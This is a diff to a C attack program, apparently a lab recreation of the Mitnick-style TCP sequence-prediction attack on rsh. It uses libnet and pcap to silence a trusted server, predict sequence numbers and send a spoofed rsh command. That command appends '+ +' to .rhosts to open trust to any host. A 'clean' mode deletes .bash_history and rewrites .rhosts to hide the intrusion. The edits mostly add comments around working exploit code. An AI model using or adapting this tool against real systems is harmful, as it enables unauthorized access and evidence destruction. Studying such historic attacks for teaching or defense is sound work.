@@ -17,8 +17,8 @@
 #define DSTPORT 514
 #define EXPLOIT "0\0tsutomu\0tsutomu\0echo -e '\n+ +' >> .rhosts"
 #define EXPLOITLEN 44
-#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; echo -e 'server tsutomu\n' > .rhosts.back"
-#define CLEANLEN 78
+#define CLEAN "0\0tsutomu\0tsutomu\0rm .bash_history ; echo -e 'server tsutomu\n' > .rhosts"
+#define CLEANLEN 73
 
 void sendExploit(uint32_t next, char *payload, int plen, u_long xterminal, u_long server, libnet_t *l);
 
@@ -34,13 +34,15 @@ int main(int argc, char **argv)
     //Libnet Context and buffer for storing error
     libnet_t *l;  
     char errbuf[LIBNET_ERRBUF_SIZE];
-    int clean=0;
     
+    int clean=0;
+    //check if the program is invoked to clean the last attack  
     if(argc>1)
     {
         if(strcmp(argv[1],"clean")==0)
             clean=1;
     }
+    //Initialize libnet
     l = libnet_init(LIBNET_RAW4, NULL, errbuf);
 
     //Check on libnet initialization
@@ -48,7 +50,7 @@ int main(int argc, char **argv)
         fprintf(stderr, "Libnet initialization failed: %s\n", errbuf);
         exit(EXIT_FAILURE);
     }
-    //seed the number generator
+    //Seed the number generator
     libnet_seed_prand(l);
 
     //Retrieving IP by conversion and check 
@@ -78,13 +80,15 @@ int main(int argc, char **argv)
     fflush(stdout);
     disableServer(l,sniffip,server);
     
+    //Clear packets in context
     libnet_clear_packet(l);
-    //Create the pscket sniffer
+    //Create the packet sniffer
     pcap_t *des=packetSnifferInitialize();
 
-
+    
     if (clean==0)
     {
+        //Get next seq
         uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
         libnet_clear_packet(l);
         printf("\nNext: %u",next);
@@ -93,7 +97,8 @@ int main(int argc, char **argv)
         sendExploit(next,EXPLOIT,EXPLOITLEN,xterminal,server, l);
     }
     else
-    {
+    {   
+    
         uint32_t next=getNextSeq(l,kevin,xterminal,513,514,des);
         libnet_clear_packet(l);
         printf("\nNext: %u",next);
@@ -101,15 +106,16 @@ int main(int argc, char **argv)
         sendExploit(next,CLEAN,CLEANLEN,xterminal,server, l );
     }
     
-    
+    //Clear packet from context
     libnet_clear_packet(l);
-    //RESTORE THE SERVER*/
-    printf("\n Enabling the server...");
+    //RESTORE THE SERVER
+    printf("\nEnabling the server...\n");
     fflush(stdout);
     enableServer(l,kevin,server);
     
 
-    
+    //Cleanup
+    libnet_clear_packet(l);
     libnet_destroy(l);
     return 0;
 }
